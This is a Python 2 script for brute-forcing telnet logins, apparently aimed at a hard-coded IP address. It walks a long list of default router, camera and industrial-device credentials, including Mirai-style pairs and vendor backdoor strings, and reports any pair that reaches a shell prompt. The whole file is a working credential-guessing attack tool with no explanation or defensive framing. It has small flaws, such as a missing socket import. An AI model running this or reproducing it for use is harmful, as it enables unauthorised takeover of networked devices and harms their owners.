# 71.178.128.180

import sys
import telnetlib
host = "71.178.128.180"
port="23"
print("Enter IP address:  ")
host=raw_input()
print("Enter port: ")
port=raw_input()
user = "admin"

def attack_telnet(user,passwd):
	try:
		tn=telnetlib.Telnet(host,port)
	except:
		print("telnet host not accessible")
		sys.exit()

	try:
		tn.read_until("Login")
	except EOFError:
		print("Error: read(login) faied")
	try:
		tn.write(user + "\n")
	except socket.error:
		print("Error: write(username)")

	if passwd:
		try:
			tn.read_until("Password")
		except EOFError:
			print("error read(password)")

		try:
			tn.write(passwd + "\n")
		except socket.error:
			print("error: write(password) failed")

	try:
		(i,obj,byt)=tn.expect([b'incorrect',b'@',b'$'],2)
		if i==1 or i==2:
			print("password cracked successfully")
			return True
	except EOFError:
		print ("Error occured")


	tn.close()
	return False



usernames=['root', 'administrator', 'NetLinx', 'administrator', 'amx', 'amx', 'admin', 'admin', 'Administrator', 'cisco', 'root', 'user', 'root', 'localadmin', 'Root', 'Admin', 'User', 'Guest', 'root', 'admin', 'adtec', 'root', 'root', 'Admin', 'root', 'admin', 'Admin', 'User', 'GE', 'Admin', 'device', 'apc', 'root', 'root', 'root', 'root', 'admin', 'admin', 'admin', '888888', '666666', 'ubnt', 'admin', 'adminttd', 'root', 'admin', 'tech', 'manager', 'smc', 'netscreen', 'netopia', 'root', 'root', 'root', 'root', 'root', 'support', 'root', 'root', 'root', 'admin', 'root', 'admin', 'root', 'root', 'root', 'Administrator', 'service', 'guest', 'guest', 'admin1', 'administrator', 'root', 'root', 'root', 'root', 'root', 'root', 'root', 'root', 'root', 'root', 'root', 'root', 'root', 'root', 'admin', 'admin', 'default', 'admin', 'default', 'admin', 'supervisor', 'admin', 'root', 'dm', 'webguest', 'Liebert', 'User', 'admin', 'root', 'admin', 'user', 'admin', 'guest', 'admin', 'root', 'qbf77101', 'ftpuser', 'USER', 'Basisk', 'sconsole', 'root', 'root', 'MayGion', 'admin', 'admin', 'default', 'admin', 'admin', 'root', 'root', 'Alphanetworks', 'Alphanetworks', 'Alphanetworks', 'Alphanetworks', 'Alphanetworks', 'Alphanetworks', 'Alphanetworks', 'Alphanetworks', 'Alphanetworks', 'Alphanetworks', 'Alphanetworks', 'Alphanetworks', 'Alphanetworks', 'Alphanetworks', 'root', 'mg3500', 'root', 'root', 'root', 'admin', 'admin', 'admin', 'admin', 'root']
passwords=['calvin', 'password', 'password', 'Amx1234!', 'password', 'Amx1234!', '1988', 'admin', 'Vision2', 'cisco', 'fidel123', 'user', 'default', 'localadmin', 'wago', 'wago', 'user', 'guest', 'rootpasswd', 'password', 'none', 'timeserver', 'password', 'Su', 'admin', 'motorola', '5001', '1001', 'GE', 'Pass', 'apc', 'apc', 'anni2013', 'xc3511', 'dreambox', 'vizxv', '1111111', 'smcadmin', '4321', '888888', '666666', 'ubnt', '22222', 'adminttd', '!root', 'epicrouter', 'tech', 'manager', 'smcadmin', 'netscreen', 'netopia', '888888', 'xmhdipc', 'juantech', '123456', '54321', 'support', 'root', '12345', 'pass', 'admin1234', '1111', '1111', '666666', '1234', 'klv123', 'admin', 'service', 'guest', '12345', 'password', '1234', 'klv1234', 'Zte521', 'hi3518', 'jvbzd', 'anko', 'zlxx.', '7ujMko0vizxv', '7ujMko0admin', 'system', 'ikwb', 'dreambox', 'user', 'realtek', '00000000', '1234', '12345', 'OxhlwSG8', 'tlJwpbo6', 'S2fGqNFs', 'meinsm', 'supervisor', '123456', 'zlxx', 'telnet', '1', 'Liebert', 'User', 'avocent', 'linux', 'system', 'public', 'private', 'guest', 'admin', 'root', 'hexakisoctahedron', 'password', 'USER', 'Basisk', '12345', '5up', 'cat1029', 'maygion.com', 'cat1029', 'ZmqVfoSIP', 'antslq', 'microbusiness', 'jvc', 'GM8182', 'uClinux', 'wrgg19_c_dlwbr_dir300', 'wrgn49_dlob_dir600b', 'wrgn23_dlwbr_dir600b', 'wrgn22_dlwbr_dir615', 'wrgnd08_dlob_dir815', 'wrgg15_di524', 'wrgn39_dlob.hans_dir645', 'wapnd03cm_dkbs_dap2555', 'wapnd04cm_dkbs_dap3525', 'wapnd15_dlob_dap1522b', 'wrgac01_dlob.hans_dir865', 'wrgn23_dlwbr_dir300b', 'wrgn28_dlob_dir412', 'wrgn39_dlob.hans_dir645_V1', 'oelinux123', 'merlin', 'cxlinux', '1001chin', 'china123', 'symbol', 'Symbol', 'superuser', 'admin123', '2008082']


for user in usernames: 
  for pwd in passwords:
    passwd=pwd.strip()
    print ("trying username",user)
    print ("trying password",passwd)
    if(attack_telnet(user,passwd)):
      print("password is: ", passwd)
      print("username is: ", user)
      sys.exit()
print("couldnt find the password")
